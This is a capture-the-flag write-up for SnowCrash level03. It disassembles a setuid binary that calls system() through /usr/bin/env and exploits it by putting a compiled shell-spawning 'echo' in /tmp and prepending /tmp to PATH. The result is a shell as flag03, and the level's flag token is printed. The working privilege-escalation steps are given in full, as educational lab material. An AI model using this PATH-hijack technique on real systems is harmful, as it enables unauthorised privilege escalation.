# level03

Looking at home and we see a executable file:
```
level03@SnowCrash:~$ ls -l 
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
level03@SnowCrash:~$ ./level03 
Exploit me
```
Time for a bit of reverse:
```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x080484a4 <+0>:	push   ebp
   0x080484a5 <+1>:	mov    ebp,esp
   0x080484a7 <+3>:	and    esp,0xfffffff0
   0x080484aa <+6>:	sub    esp,0x20
   0x080484ad <+9>:	call   0x80483a0 <getegid@plt>
   0x080484b2 <+14>:	mov    DWORD PTR [esp+0x18],eax
   0x080484b6 <+18>:	call   0x8048390 <geteuid@plt>
   0x080484bb <+23>:	mov    DWORD PTR [esp+0x1c],eax
   0x080484bf <+27>:	mov    eax,DWORD PTR [esp+0x18]
   0x080484c3 <+31>:	mov    DWORD PTR [esp+0x8],eax
   0x080484c7 <+35>:	mov    eax,DWORD PTR [esp+0x18]
   0x080484cb <+39>:	mov    DWORD PTR [esp+0x4],eax
   0x080484cf <+43>:	mov    eax,DWORD PTR [esp+0x18]
   0x080484d3 <+47>:	mov    DWORD PTR [esp],eax
   0x080484d6 <+50>:	call   0x80483e0 <setresgid@plt>
   0x080484db <+55>:	mov    eax,DWORD PTR [esp+0x1c]
   0x080484df <+59>:	mov    DWORD PTR [esp+0x8],eax
   0x080484e3 <+63>:	mov    eax,DWORD PTR [esp+0x1c]
   0x080484e7 <+67>:	mov    DWORD PTR [esp+0x4],eax
   0x080484eb <+71>:	mov    eax,DWORD PTR [esp+0x1c]
   0x080484ef <+75>:	mov    DWORD PTR [esp],eax
   0x080484f2 <+78>:	call   0x8048380 <setresuid@plt>
   0x080484f7 <+83>:	mov    DWORD PTR [esp],0x80485e0
   0x080484fe <+90>:	call   0x80483b0 <system@plt>
   0x08048503 <+95>:	leave  
   0x08048504 <+96>:	ret 
```
We sees that the program is calling system with a string at the address 0x80485e0:
```
gdb-peda$ x/s 0x80485e0
0x80485e0:	"/usr/bin/env echo Exploit me"
```
Let's do a small main.c:
```
#include <unistd.h>

int			main(int argc, char *argv[], char *env[])
{
	char *lol[] = {"/bin/sh", 0x0};
	execve("/bin/sh", lol, env);
}
```
Then compile it and rename it under /tmp:
```
gcc main.c && mv a.out /tmp/echo
```
then trick the PATH and bingo:
```
level03@SnowCrash:~$ export PATH="/tmp:$PATH"
level03@SnowCrash:~$ ./level03 
$ whoami
flag03
$ getflag
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
